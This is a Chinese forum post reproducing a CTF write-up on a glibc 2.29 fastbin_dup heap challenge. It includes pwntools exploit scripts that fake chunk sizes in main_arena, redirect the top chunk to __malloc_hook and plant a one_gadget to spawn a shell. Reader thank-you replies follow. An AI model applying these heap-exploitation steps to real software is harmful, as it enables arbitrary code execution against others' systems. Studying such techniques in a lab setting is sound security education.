> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.52pojie.cn](https://www.52pojie.cn/thread-1424863-1-1.html)

> [md]相比之前的 fastbin_dup 小幅度的提高一点难度，从博客搬运来的欢迎各位去访问我的 [博客](https://hack1s.fun/) 漏洞本身和之前一样也是 fastbin_dup 直 ... 从......

 ![](https://avatar.52pojie.cn/data/avatar/001/57/34/12_avatar_middle.jpg) 呆毛王与咖喱棒 _ 本帖最后由 呆毛王与咖喱棒 于 2021-11-7 17:33 编辑_  

相比之前的 fastbin_dup 小幅度的提高一点难度，从博客搬运来的

欢迎各位去访问我的[博客](https://hack1s.fun/)

漏洞本身和之前一样也是 fastbin_dup

直接尝试一下相同的方法

![](https://static.hack1s.fun/images/2021/03/09/image-20210309210502975.png)

找到`__malloc_hook`附近可以伪造的 fake chunk

这个和之前完全一样，但是这个程序在 malloc 的时候的限制更大，0x70 大小的 chunk 被限制了

![](https://static.hack1s.fun/images/2021/03/09/image-20210309211406434.png)

可以申请 0x60 的 chunk 也可以申请 0x80 的 chunk，就是不能申请 0x70 的

![](https://static.hack1s.fun/images/2021/03/09/image-20210309211610643.png)

实际上这个程序的难点就是要设法使用和之前不同的方式绕过 chunk 对 size 的检查

自己尝试

思路是修改`main_arena`处 0x70 对应的 fastbin 地址

![](https://static.hack1s.fun/images/2021/03/10/image-20210310145847114.png)

在 arena 附近这里查找到的这两个 fake chunk 也都是 size 为`0x7f`

还是解决不了问题

![](https://static.hack1s.fun/images/2021/03/10/image-20210310150452175.png)

所以尝试首先通过两次 Double Free 把 0x50、0x60 这两个 bins 的地址修改成伪造的 chunk 头

例如首先用这样的执行流

```
a=malloc(0x48,"a")
b=malloc(0x48,"b")

free(a)
free(b)
free(a)

malloc(0x48,p64(0x61))
malloc(0x48,"a")
malloc(0x48,"b")

```

这样的一个流程结束之后就相当于在`main_arena`中 0x50 的 chunk 链表处写入了`0x00000061`

用 GDB 调试再用`find_fake_fast`

![](https://static.hack1s.fun/images/2021/03/10/image-20210310152249545.png)

现在已经让`main_arena`中可以满足 size 字段的检查了，接下来再通过一次 fastbin_dup 来申请这个位置的 chunk

malloc 和 free 的流程如下

```
c=malloc(0x58,"C")
d=malloc(0x58,"D")

free(c)
free(d)
free(c)

malloc(0x58,p64(libc.sym.main_arena+40))
malloc(0x58,"c")
malloc(0x58,"d")

```

这里的 40 是通过看 0x50 的 chunk 所在的位置`p &main_arena->fastbinsY[3]`

运行完毕之后查看 fastbins

![](https://static.hack1s.fun/images/2021/03/10/image-20210310153723077.png)

发现这个地址好像没有对上，覆盖的那个地方应该是`7b80`，但是写的是`7b88`

所以第二次填充的那个再改一下，改成`libc.sym.main_arena+32`

这样从`0x7b80`开始就是一个符合 chunk 结构的 fake chunk 了

![](https://static.hack1s.fun/images/2021/04/01/image-20210401161229831.png)

目标就是修改掉红框中的这个

Arena 的结构中有一个地方是指示了 top chunk 的

可以尝试通过在`main_arena`中修改掉 top chunk 的值，修改为`__malloc_hook`前面 0x10 字节

这样之后申请写入就是直接修改`__malloc_hook`了

![](https://static.hack1s.fun/images/2021/03/10/image-20210310161659389.png)

我们伪造的 chunk 的 user data 是从 0x60 开始的

所以首先要填充所有的 fastbin，之后的一个字就是 top chunk

所以再一次 malloc 修改 top chunk，一次 malloc 修改`__malloc_hook`

```
malloc(0x58,b"a"*0x10*3+p64(lib.sym.__malloc_hook-0x10))
malloc(0x28,p64(libc.sym.system))

```

结果发现报错了，说是 corrupted top size

查看一下原因

![](https://static.hack1s.fun/images/2021/04/01/image-20210401165045099.png)

发现是在这里比较`__glibc_unlikely(size>av->system_mem)`之后才会进入到这里

这是因为 Glibc 2.29 中对 top chunk 进行了一些检查；

之前的 House of Force 使用的是更低版本的 glibc

比较中的这个`av`是一个变量，来表示`arena`管理着这个堆，在这种情况下，`system_mem`是从 kernel 检查出的当前 arena 内存的大小；

实际这里的值是 0x21000，是我们初始化堆时的大小

如果 malloc 发现 top chunk 申请的内存比这个还要大，就会认为有地方出错导致中止分配内存

我们这里想要用一个 GLIBC 中的地址来伪造 top chunk 的 size，比`system_mem`的内容要大得多

这里的绕过方式和之前伪造出 0x7f 那样的 size 比较类似；

也是利用这里不需要按照 16 字节对齐绕过的

我们首先把后面写的一堆内容注释掉，看一下初始化时的 top chunk 的状态

![](https://static.hack1s.fun/images/2021/04/01/image-20210401191555374.png)

这里的索引大概是`main_arena`中的`top`是一个`mchunkptr`，这个值是`0x555555757160`，这个地方是一个 top chunk 的结构体，他就是一个普通的堆 chunk 的结构

![](https://static.hack1s.fun/images/2021/04/01/image-20210401191846613.png)

所以第二个字，`0x20ea1`这里就是它的大小

再执行一遍我们写入 top 为`lib.sym.__malloc_hook-0x10`这样的脚本

![](https://static.hack1s.fun/images/2021/04/01/image-20210401192541181.png)

可以看到红圈里面相当于是伪造的 top chunk 的 size

这个 size 和之前 0x21000 相比大了太多了，所以就会报错；

那么我们在`__malloc_hook`再尝试一下`find_fake_fast`

![](https://static.hack1s.fun/images/2021/04/01/image-20210401192914459.png)

可以看到我们写入值之后，这里`7f`可以当作 chunk size 的标志位来用了

这两个地址之间距离`0x50-0x2d`结果差了十进制的 35；

所以我们把之前写的`malloc(0x58,b"a"*0x10*3+p64(lib.sym.__malloc_hook-0x10))`

改成`malloc(0x58,b"a"*0x10*3+p64(lib.sym.__malloc_hook-35))`再试一下

![](https://static.hack1s.fun/images/2021/04/01/image-20210401193134773.png)

这时这个 size 字段只有`7f`，就可以通过验证了；

那么下一步就是覆盖`__malloc_hook`为我们想要执行的内容；

还是一样的使用 one_gadget

![](https://static.hack1s.fun/images/2021/04/01/image-20210401195356330.png)

搜索出来这三个结果

在`__malloc_hook`下断点，之后触发 malloc，看这时的寄存器状态

![](https://static.hack1s.fun/images/2021/04/01/image-20210401201516901.png)

结果这三个 gadget 的约束条件都不满足；

但是回来看到

![](https://static.hack1s.fun/images/2021/04/01/image-20210401203548451.png)

执行时 rsp+50 的位置是可控的

现在我们最后一小部分的代码是

```
malloc(0x58,p64(libc.sym.main_arena+32))

malloc(0x58,"G"*8)
malloc(0x58,"H"*8)

malloc(0x58,b"Y"*48+p64(libc.sym.__malloc_hook-36))                                                                                                                                 
malloc(0x28,b"Z"*20+p64(libc.address+one_gadget))

```

直接执行的话会提示

![](https://static.hack1s.fun/images/2021/04/01/image-20210401205651104.png)

就是说把其中`HHHHHHHH:GGGGGGGG`这个当作文件来传入 sh 了

这个位置正好是调用`sh`的`arg[1]`，解决办法的话，我们可以将其中的`GGGGGGGG`改为`-s\0`

这样就相当于是调用了`sh -s`，

看一下 bash 的手册

```
If the -s option is present, or if no arguments remain after option processing, then commands are read from the standard input.  This option allows the positional parameters to be set when invoking an  interactive  shell  or when reading input through a pipe.

```

所以加上`-s`之后调用时就不会从文件定位而是从 stdin 输入了；

这样就可以拿到一个 shell 权限

最终执行的流程

```
one_gadget = 0xe1fa1
#  one_gadget = 0xe1fad
#  one_gadget = 0xc4dbf

# Request two 0x50-sized chunks.
chunk_A = malloc(0x48, "A"*8)
chunk_B = malloc(0x48, "B"*8)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

malloc(0x48,p64(0x61))
malloc(0x48,"C"*8)
malloc(0x48,"D"*8)

chunk_C = malloc(0x58,"E"*8)
chunk_D = malloc(0x58,"F"*8)

free(chunk_C)
free(chunk_D)
free(chunk_C)

malloc(0x58,p64(libc.sym.main_arena+32))
malloc(0x58,"-s\0")
#  malloc(0x58,"G"*8)
malloc(0x58,"H"*8)                                                                                                                   

malloc(0x58,b"Y"*48+p64(libc.sym.__malloc_hook-36))

malloc(0x28,b"Z"*20+p64(libc.address+one_gadget))
malloc(1,'')

```

执行脚本效果

![](https://static.hack1s.fun/images/2021/04/01/image-20210401210231452.png)

![](https://static.52pojie.cn/static/image/filetype/zip.gif)

[challenge-fastbin_dup.zip](forum.php?mod=attachment&aid=MjI3MjY3OXwxMmNkNzczOXwxNjM2NTQ4MzAyfDIxMzQzMXwxNDI0ODYz)

2021-4-22 23:03 上传

点击文件名下载附件

下载积分: 吾爱币 -1 CB  

5.88 KB, 下载次数: 13, 下载积分: 吾爱币 -1 CB![](https://avatar.52pojie.cn/data/avatar/001/57/34/12_avatar_middle.jpg)> [woshitc008 发表于 2021-4-27 19:46](https://www.52pojie.cn/forum.php?mod=redirect&goto=findpost&pid=38270058&ptid=1424863)  
> 你家的 malloc 为何会有两个参数

python 做的封装，pwntools 和二进制程序交互常见操作，看一下脚本就知道了  
[Python] _纯文本查看_ _复制代码_

```
def malloc(size, data):
   io.send("1")
   io.sendafter("size: ", f"{size}")
   io.sendafter("data: ", data)
   io.recvuntil("> ")

``` ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)呆毛王与咖喱棒

> [呆毛王与咖喱棒 发表于 2021-4-28 19:41](https://www.52pojie.cn/forum.php?mod=redirect&goto=findpost&pid=38288486&ptid=1424863)  
> python 做的封装，pwntools 和二进制程序交互常见操作，看一下脚本就知道了  
> [mw_shl_code=python,true]  ...

原来如此  受教了 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) 技术贴，看不懂凑个热闹！![](https://avatar.52pojie.cn/data/avatar/000/48/62/99_avatar_middle.jpg)woshitc008 谢谢楼主分享 很详细 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) id3721 感谢楼主分享技术 学习学习 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) chenjingyes 感谢楼主分享技术 学习学习![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)烟痕呀 好好学习一下了。支持![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)那时一起走

> [那时一起走 发表于 2021-4-23 00:42](https://www.52pojie.cn/forum.php?mod=redirect&goto=findpost&pid=38188037&ptid=1424863)  
> 感谢楼主分享技术 学习学习

谢楼主分享技术 学习学习 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) tbloy 感谢楼主的分享。![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)chenchen521 感谢楼主分享 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) xdnice 技术贴，学习了